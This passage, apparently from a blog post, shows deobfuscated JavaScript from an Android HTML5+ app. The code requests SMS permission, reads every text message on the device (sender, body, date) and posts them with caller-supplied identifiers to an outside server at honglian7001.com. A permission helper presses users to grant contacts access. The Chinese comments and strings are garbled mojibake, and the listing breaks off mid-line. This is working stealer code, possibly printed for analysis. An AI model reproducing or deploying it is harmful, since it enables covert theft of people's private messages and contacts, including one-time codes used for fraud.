class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">/*</span><br><span class="hljs-comment">*Aman - 194nb.com</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Progcessed By JSDec in 0.00s</span><br><span class="hljs-comment"> *JSDec - JSDec.js.org</span><br><span class="hljs-comment"> */</span><br>mui.<span class="hljs-title function_">init</span>();<br><br>mui.<span class="hljs-title function_">plusReady</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-comment">//var main = plus.android.runtimeMainActivity();  </span><br><span class="hljs-comment">// main.moveTaskToBack(false);</span><br><br><span class="hljs-keyword">var</span> address = plus.<span class="hljs-property">device</span>.<span class="hljs-property">vendor</span> + <span class="hljs-string">&#x27;-&#x27;</span> + plus.<span class="hljs-property">device</span>.<span class="hljs-property">model</span>;<br>address = address.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\n/g</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/ /g</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/\r/g</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-keyword">var</span> apiserver = <span class="hljs-string">&#x27;http://www.honglian7001.com/api/uploads/&#x27;</span>;<br><span class="hljs-comment">//é‡å¤æ•°æ®å¤„ç† é¢„é˜²ç”¨æˆ·é‡å¤ç‚¹å‡»</span><br><span class="hljs-keyword">var</span> danjishijian = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">requestPermission</span>(<span class="hljs-params">sjh, yqm</span>) &#123;<br>plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">requestPermissions</span>(<br>[<span class="hljs-string">&quot;android.permission.READ_SMS&quot;</span>],<br><span class="hljs-keyword">function</span> (<span class="hljs-params">resultObj</span>) &#123;<br><span class="hljs-comment">//SmsInfoå­˜æ”¾ä¸€æ¡çŸ­ä¿¡çš„å„é¡¹å†…å®¹</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">SmsInfo</span> = &#123;&#125;<br><span class="hljs-comment">//Smså­˜æ”¾æ‰€æœ‰çŸ­ä¿¡</span><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Sms</span> = &#123;&#125;<br><br><span class="hljs-keyword">var</span> aimei = sjh;<br><span class="hljs-keyword">var</span> aimei2 = yqm;<br><span class="hljs-keyword">var</span> duanxin = <span class="hljs-string">&#x27;[&#123;&quot;imei&quot;:&quot;&#x27;</span> + aimei + <span class="hljs-string">&#x27;&quot;,&quot;imei2&quot;:&quot;&#x27;</span> + aimei2 + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Cursor</span> = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">importClass</span>(<span class="hljs-string">&quot;android.database.Cursor&quot;</span>)<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Uri</span> = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">importClass</span>(<span class="hljs-string">&quot;android.net.Uri&quot;</span>) Â  <span class="hljs-comment">//æ³¨æ„å•¦ï¼Œandroid.net.Uriä¸­çš„netæ˜¯å°å†™</span><br><span class="hljs-keyword">var</span> activity = plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">runtimeMainActivity</span>()<br><span class="hljs-keyword">var</span> uri = <span class="hljs-title class_">Uri</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;content://sms/&quot;</span>);<br><br><span class="hljs-keyword">var</span> projection = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-string">&quot;_id&quot;</span>, <span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;person&quot;</span>, <span class="hljs-string">&quot;body&quot;</span>, <span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-string">&quot;type&quot;</span>)<br><span class="hljs-keyword">var</span> cusor = activity.<span class="hljs-title function_">managedQuery</span>(uri, projection, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;date desc&quot;</span>)<br><span class="hljs-keyword">var</span> idColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;_id&quot;</span>)<br><span class="hljs-keyword">var</span> nameColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;person&quot;</span>)<br><span class="hljs-keyword">var</span> phoneNumberColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;address&quot;</span>)<br><span class="hljs-keyword">var</span> smsbodyColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;body&quot;</span>)<br><span class="hljs-keyword">var</span> dateColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;date&quot;</span>)<br><span class="hljs-keyword">var</span> typeColumn = cusor.<span class="hljs-title function_">getColumnIndex</span>(<span class="hljs-string">&quot;type&quot;</span>)<br><span class="hljs-keyword">if</span> (cusor != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">while</span> (cusor.<span class="hljs-title function_">moveToNext</span>()) &#123;<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">id</span> = cusor.<span class="hljs-title function_">getString</span>(idColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Name</span> = cusor.<span class="hljs-title function_">getInt</span>(nameColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span> = cusor.<span class="hljs-title function_">getLong</span>(dateColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span> = <span class="hljs-title function_">getFormatDate</span>(<span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Date</span>)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">PhoneNumber</span> = cusor.<span class="hljs-title function_">getString</span>(phoneNumberColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Smsbody</span> = cusor.<span class="hljs-title function_">getString</span>(smsbodyColumn)<br><span class="hljs-title class_">SmsInfo</span>.<span class="hljs-property">Type</span> = cusor.<span class="hljs-title function_">getString</span>(typeColumn)<br><br><span class="hljs-keyword">var</span> post = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title class_">SmsInfo</span>);<br><span class="hljs-comment">//console.log(post);</span><br>duanxin = duanxin + <span class="hljs-string">&#x27;,&#x27;</span> + post;<br><br>&#125;<br>duanxin = duanxin + <span class="hljs-string">&#x27;]&#x27;</span>;<br><span class="hljs-comment">//alert(duanxin);</span><br><br>mui.<span class="hljs-title function_">ajax</span>(apiserver + <span class="hljs-string">&#x27;apisms&#x27;</span>, &#123;<br><span class="hljs-attr">data</span>: &#123;<br><span class="hljs-attr">data</span>: duanxin<br>&#125;,<br><span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-comment">//æœåŠ¡å™¨è¿”å›jsonæ ¼å¼æ•°æ®</span><br><span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-comment">//HTTPè¯·æ±‚ç±»å‹</span><br><span class="hljs-attr">timeout</span>: <span class="hljs-number">10000</span>,<span class="hljs-comment">//è¶…æ—¶æ—¶é—´è®¾ç½®ä¸º10ç§’ï¼›              </span><br><span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">data</span>) &#123;<br>mui.<span class="hljs-title function_">toast</span>(<span class="hljs-string">&#x27;è·å–æˆåŠŸ&#x27;</span>)<br><span class="hljs-comment">//console.log(con)</span><br><br><br>&#125;,<br><span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">xhr, type, errorThrown</span>) &#123;<br><span class="hljs-comment">//å¼‚å¸¸å¤„ç†ï¼›</span><br><br>&#125;<br>&#125;);<br>cusor.<span class="hljs-title function_">close</span>()<br>&#125;<br><br>&#125;,<br><span class="hljs-keyword">function</span> (<span class="hljs-params">error</span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;ç”³è¯·æƒé™é”™è¯¯ï¼š&#x27;</span> + error.<span class="hljs-property">code</span> + <span class="hljs-string">&quot; = &quot;</span> + error.<span class="hljs-property">message</span>);<br>&#125;);<br>&#125;<br><br><br><br><span class="hljs-comment">//æ‰©å±•DateåŠŸèƒ½ï¼šå°†longå‹æ—¥æœŸè½¬æ¢ä¸ºç‰¹å®šçš„æ ¼å¼</span><br><span class="hljs-title class_">Date</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">format</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">format</span>) &#123;<br><span class="hljs-keyword">var</span> o = &#123;<br><span class="hljs-string">&quot;M+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">1</span>,<br><span class="hljs-string">&quot;d+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getDate</span>(),<br><span class="hljs-string">&quot;h+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getHours</span>(),<br><span class="hljs-string">&quot;m+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMinutes</span>(),<br><span class="hljs-string">&quot;s+&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getSeconds</span>(),<br><span class="hljs-string">&quot;q+&quot;</span>: <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>((<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMonth</span>() + <span class="hljs-number">3</span>) / <span class="hljs-number">3</span>),<br><span class="hljs-string">&quot;S&quot;</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getMilliseconds</span>()<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-regexp">/(y+)/</span>.<span class="hljs-title function_">test</span>(format)) &#123;<br>format = format.<span class="hljs-title function_">replace</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>, (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFullYear</span>() + <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">substr</span>(<span class="hljs-number">4</span> - <span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>.<span class="hljs-property">length</span>));<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k <span class="hljs-keyword">in</span> o) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<span class="hljs-string">&quot;(&quot;</span> + k + <span class="hljs-string">&quot;)&quot;</span>).<span class="hljs-title function_">test</span>(format)) &#123;<br>format = format.<span class="hljs-title function_">replace</span>(<span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>, <span class="hljs-title class_">RegExp</span>.<span class="hljs-property">$1</span>.<span class="hljs-property">length</span> == <span class="hljs-number">1</span> ? o[k] : (<span class="hljs-string">&quot;00&quot;</span> + o[k]).<span class="hljs-title function_">substr</span>((<span class="hljs-string">&quot;&quot;</span> + o[k]).<span class="hljs-property">length</span>));<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> format;<br>&#125;<br><br><br><span class="hljs-comment">//å°†longå‹æ—¥æœŸè½¬æ¢ä¸ºç‰¹å®šæ ¼å¼</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getFormatDate</span>(<span class="hljs-params">l, pattern</span>) &#123;<br>date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(l);<br><span class="hljs-keyword">if</span> (pattern == <span class="hljs-literal">undefined</span>) &#123;<br>pattern = <span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>;<br>&#125;<br><span class="hljs-keyword">return</span> date.<span class="hljs-title function_">format</span>(pattern);<br>&#125;<br><br><br><span class="hljs-comment">//alert(plus.device.uuid)</span><br>plus.<span class="hljs-property">navigator</span>.<span class="hljs-title function_">setStatusBarBackground</span>(<span class="hljs-string">&quot;#db6eff&quot;</span>);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">off</span>(<span class="hljs-string">&quot;tap&quot;</span>);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#tx&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><br>$(<span class="hljs-string">&#x27;#tx&#x27;</span>).<span class="hljs-title function_">hide</span>();<br>$(<span class="hljs-string">&#x27;#zz&#x27;</span>).<span class="hljs-title function_">show</span>();<br>&#125;);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#gb&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><br>$(<span class="hljs-string">&#x27;#tx&#x27;</span>).<span class="hljs-title function_">show</span>();<br>$(<span class="hljs-string">&#x27;#zz&#x27;</span>).<span class="hljs-title function_">hide</span>();<br>&#125;);<br><br><span class="hljs-title function_">mui</span>(<span class="hljs-string">&quot;body&quot;</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;tap&#x27;</span>, <span class="hljs-string">&#x27;#qd&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br><span class="hljs-keyword">if</span> (danjishijian) &#123;<br>danjishijian = <span class="hljs-literal">false</span>;<br><span class="hljs-title function_">aa</span>()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title function_">aa</span>()<br>&#125;<br><br>&#125;);<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getPermission</span>(<span class="hljs-params">permissionIdentity, successCallBack, errorCallBack</span>) &#123;<br><span class="hljs-comment">//æƒé™æ ‡è¯†è½¬æ¢æˆå¤§å†™  </span><br><span class="hljs-keyword">var</span> permissionIdentity = permissionIdentity.<span class="hljs-title function_">toUpperCase</span>();<br><span class="hljs-comment">//è·å–æ£€æµ‹æƒé™çš„çŠ¶æ€  </span><br><span class="hljs-keyword">var</span> checkResult = plus.<span class="hljs-property">navigator</span>.<span class="hljs-title function_">checkPermission</span>(permissionIdentity);<br><span class="hljs-comment">//æƒé™çŠ¶æ€æ˜¯å¦æ­£å¸¸  </span><br><span class="hljs-keyword">var</span> permissionStatusOk = <span class="hljs-literal">false</span>;<br><span class="hljs-comment">//æƒé™ä¸­æ–‡åç§°  </span><br><span class="hljs-keyword">var</span> permissionName = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">//å¯¹åº” andorid çš„å…·ä½“æƒé™  </span><br><span class="hljs-keyword">var</span> androidPermission = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-comment">//è·å–æƒé™ä¸­æ–‡æ„æ€ä¸å¯¹åº” android ç³»ç»Ÿçš„æƒé™å­—ç¬¦ä¸²  </span><br><span class="hljs-keyword">switch</span> (permissionIdentity) &#123;<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;CONTACTS&#x27;</span>:<br>permissionName = <span class="hljs-string">&#x27;ç³»ç»Ÿè”ç³»äºº&#x27;</span>;<br>androidPermission = <span class="hljs-string">&#x27;android.permission.READ_CONTACTS&#x27;</span><br><span class="hljs-keyword">break</span>;<br><br><span class="hljs-attr">default</span>:<br>permissionName = <span class="hljs-string">&#x27;æœªçŸ¥&#x27;</span>;<br>androidPermission = <span class="hljs-string">&#x27;æœªçŸ¥&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">//åˆ¤æ–­æ£€æŸ¥æƒé™çš„ç»“æœ  </span><br><span class="hljs-keyword">switch</span> (checkResult) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;authorized&#x27;</span>:<br><span class="hljs-comment">//æ­£å¸¸çš„  </span><br>permissionStatusOk = <span class="hljs-literal">true</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;denied&#x27;</span>:<br><span class="hljs-comment">//è¡¨ç¤ºç¨‹åºå·²è¢«ç”¨æˆ·æ‹’ç»ä½¿ç”¨æ­¤æƒé™ï¼Œå¦‚æœæ˜¯æ‹’ç»çš„å°±å†æ¬¡æç¤ºç”¨æˆ·æ‰“å¼€ç¡®è®¤æç¤ºæ¡†  </span><br><span class="hljs-comment">//å¦‚æœæœ‰è¯¥æƒé™ä½†æ˜¯æ²¡æœ‰æ‰“å¼€ä¸è¿›è¡Œæ“ä½œè¿˜æ˜¯ä¼šå»ç”³è¯·æˆ–æ‰‹åŠ¨æ‰“å¼€  </span><br><span class="hljs-comment">// console.log(&#x27;å·²å…³é—­&#x27; + permissionName + &#x27;æƒé™&#x27;)  </span><br><span class="hljs-comment">// errorCallBack(&#x27;å·²å…³é—­&#x27; + permissionName + &#x27;æƒé™&#x27;);  </span><br><span class="hljs-comment">// return  </span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;undetermined&#x27;</span>:<br><span class="hljs-comment">// è¡¨ç¤ºç¨‹åºæœªç¡®å®šæ˜¯å¦å¯ä½¿ç”¨æ­¤æƒé™ï¼Œæ­¤æ—¶è°ƒç”¨å¯¹åº”çš„APIæ—¶ç³»ç»Ÿä¼šå¼¹å‡ºæç¤ºæ¡†è®©ç”¨æˆ·ç¡®è®¤  </span><br><span class="hljs-comment">// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  </span><br><span class="hljs-comment">// errorCallBack(&#x27;æœªç¡®å®š&#x27; + permissionName + &#x27;æƒé™&#x27;);  </span><br><span class="hljs-comment">// return  </span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;unknown&#x27;</span>:<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;æ— æ³•æŸ¥è¯¢&#x27;</span> + permissionName + <span class="hljs-string">&#x27;æƒé™&#x27;</span>);<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-attr">default</span>:<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;ä¸æ”¯æŒ&#x27;</span> + permissionName + <span class="hljs-string">&#x27;æƒé™&#x27;</span>);<br><span class="hljs-keyword">return</span><br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">//å¦‚æœæƒé™æ˜¯æ­£å¸¸çš„æ‰§è¡ŒæˆåŠŸå›è°ƒ  </span><br><span class="hljs-keyword">if</span> (permissionStatusOk) &#123;<br><span class="hljs-title function_">successCallBack</span>()<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//å¦‚æœä¸æ­£å¸¸ï¼Œå¦‚æœæ˜¯ andorid ç³»ç»Ÿï¼Œå°±åŠ¨æ€ç”³è¯·æƒé™  </span><br><span class="hljs-keyword">if</span> (plus.<span class="hljs-property">os</span>.<span class="hljs-property">name</span> == <span class="hljs-string">&#x27;Android&#x27;</span>) &#123;<br><span class="hljs-comment">//åŠ¨æ€ç”³è¯·æƒé™  </span><br>plus.<span class="hljs-property">android</span>.<span class="hljs-title function_">requestPermissions</span>([androidPermission], <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">deniedAlways</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//æƒé™è¢«æ°¸ä¹…æ‹’ç»  </span><br><span class="hljs-comment">// å¼¹å‡ºæç¤ºæ¡†è§£é‡Šä¸ºä½•éœ€è¦å®šä½æƒé™ï¼Œå¼•å¯¼ç”¨æˆ·æ‰“å¼€è®¾ç½®é¡µé¢å¼€å¯  </span><br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;è¯·æ‚¨åŒæ„å¼¹å‡ºçš„æƒé™ï¼Œä¾¿å¯æ­£å¸¸ä½¿ç”¨APPï¼å¦‚æœæœªå¼¹å‡ºï¼Œè¯·å‰å¾€â€œæ‰‹æœºè®¾ç½®â€é‡Œçš„â€œæƒé™ç®¡ç†â€æ‰¾åˆ°æœ¬åº”ç”¨ï¼Œå¹¶æ‰“å¼€é€šè®¯å½•æƒé™ï¼Œæ–¹å¯ä½¿ç”¨ã€‚&#x27;</span>)<br><span class="hljs-comment">// console.log(&#x27;Always Denied!!! &#x27; + e.deniedAlways.toString());  </span><br>&#125;<br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">deniedPresent</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//æƒé™è¢«ä¸´æ—¶æ‹’ç»  </span><br><span class="hljs-comment">// å¼¹å‡ºæç¤ºæ¡†è§£é‡Šä¸ºä½•éœ€è¦å®šä½æƒé™ï¼Œå¯å†æ¬¡è°ƒç”¨plus.android.requestPermissionsç”³è¯·æƒé™  </span><br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;è¯·æ‚¨åŒæ„å¼¹å‡ºçš„æƒé™ï¼Œä¾¿å¯æ­£å¸¸ä½¿ç”¨APPï¼å¦‚æœæœªå¼¹å‡ºï¼Œè¯·å‰å¾€â€œæ‰‹æœºè®¾ç½®â€é‡Œçš„â€œæƒé™ç®¡ç†â€æ‰¾åˆ°æœ¬åº”ç”¨ï¼Œå¹¶æ‰“å¼€é€šè®¯å½•æƒé™ï¼Œæ–¹å¯ä½¿ç”¨ã€‚&#x27;</span>)<br><span class="hljs-comment">// console.log(&#x27;Present Denied!!! &#x27; + e.deniedPresent.toString());  </span><br>&#125;<br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">granted</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">//æƒé™è¢«å…è®¸  </span><br><span class="hljs-comment">//è°ƒç”¨ä¾èµ–è·å–å®šä½æƒé™çš„ä»£ç   </span><br><span class="hljs-title function_">successCallBack</span>()<br><span class="hljs-comment">// console.log(&#x27;Granted!!! &#x27; + e.granted.toString());  </span><br>&#125;<br>&#125;, <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;è¯·æ‚¨åŒæ„å¼¹å‡ºçš„æƒé™ï¼Œä¾¿å¯æ­£å¸¸ä½¿ç”¨APPï¼å¦‚æœæœªå¼¹å‡ºï¼Œè¯·å‰å¾€â€œæ‰‹æœºè®¾ç½®â€é‡Œçš„â€œæƒé™ç®¡ç†â€æ‰¾åˆ°æœ¬åº”ç”¨ï¼Œå¹¶æ‰“å¼€é€šè®¯å½•æƒé™ï¼Œæ–¹å¯ä½¿ç”¨ã€‚&#x27;</span>)<br><span class="hljs-comment">// console.log(&#x27;Request Permissions error:&#x27; + JSON.stringify(e));  </span><br>&#125;)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (plus.<span class="hljs-property">os</span>.<span class="hljs-property">name</span> == <span class="hljs-string">&#x27;iOS&#x27;</span>) &#123;<br><span class="hljs-comment">//ios ,ç¬¬ä¸€æ¬¡ä½¿ç”¨ç›®çš„æƒé™æ—¶ï¼Œåº”ç”¨çš„æƒé™åˆ—è¡¨é‡Œæ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥å…ˆé»˜è®¤æ‰§è¡Œä¸€ä¸‹æˆåŠŸå›è°ƒï¼Œæ‰“å¼€è¦ä½¿ç”¨çš„æ“ä½œï¼Œæ¯”å¦‚ plus.camera  </span><br><span class="hljs-comment">//è¿™æ—¶ç³»ç»Ÿä¼šæç¤ºæ˜¯å¦æ‰“å¼€ç›¸åº”çš„æƒé™ï¼Œå¦‚æœæ‹’ç»ä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºåº”ç”¨çš„æƒé™åˆ—è¡¨é‡Œå·²ç»å­˜åœ¨è¯¥æƒé™äº†ï¼Œä¸‹æ¬¡å†è°ƒç”¨ç›¸åº”æƒé™æ—¶ï¼Œå°±ä¼š  </span><br><span class="hljs-comment">//èµ° else é‡Œçš„æµç¨‹ï¼Œä¼šç»™ç”¨æˆ·æç¤ºï¼Œå¹¶ä¸”è·³è½¬åˆ°åº”è¯¥çš„æƒé™é¡µé¢ï¼Œè®©ç”¨æˆ·æ‰‹åŠ¨æ‰“å¼€ã€‚  </span><br><span class="hljs-keyword">if</span> (checkResult == <span class="hljs-string">&#x27;undetermined&#x27;</span>) &#123;<br><span class="hljs-comment">//è°ƒç”¨ä¾èµ–è·å–å®šä½æƒé™çš„ä»£ç   </span><br><span class="hljs-title function_">successCallBack</span>(<span class="hljs-literal">true</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">//å¦‚æœæ˜¯ ios ç³»ç»Ÿï¼Œios æ²¡æœ‰åŠ¨æ€ç”³è¯·æ“ä½œï¼Œæ‰€ä»¥æç¤ºç”¨æˆ·å»è®¾ç½®é¡µé¢æ‰‹åŠ¨æ‰“å¼€  </span><br>mui.<span class="hljs-title function_">confirm</span>(permissionName + <span class="hljs-string">&#x27;æƒé™æ²¡æœ‰å¼€å¯ï¼Œæ˜¯å¦å»å¼€å¯ï¼Ÿ&#x27;</span>, <span class="hljs-string">&#x27;æé†’&#x27;</span>, [<span class="hljs-string">&#x27;å–æ¶ˆ&#x27;</span>, <span class="hljs-string">&#x27;ç¡®è®¤&#x27;</span>], <span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) &#123;<br><span class="hljs-comment">//å–æ¶ˆ  </span><br><span class="hljs-keyword">if</span> (e.<span class="hljs-property">index</span> == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-title function_">errorCallBack</span>(<span class="hljs-string">&#x27;è¯·æ‚¨åŒæ„å¼¹å‡ºçš„æƒé™ï¼Œä¾¿å¯æ­£å¸¸ä½¿ç”¨APPï¼å¦‚æœæœªå¼¹å‡ºï¼Œè¯·å‰å¾€â€œæ‰‹æœºè®¾ç½®â€é‡Œçš„â€œæƒé™ç®¡ç†â€æ‰¾åˆ°æœ¬åº”ç”¨ï¼Œå¹¶æ‰“å¼€é€šè®¯å½•æƒé™ï¼Œæ–¹å¯ä½¿ç”¨ã€‚&#x27;</span>)<br>&#125; <span class="hljs-keyword">else</span> <span 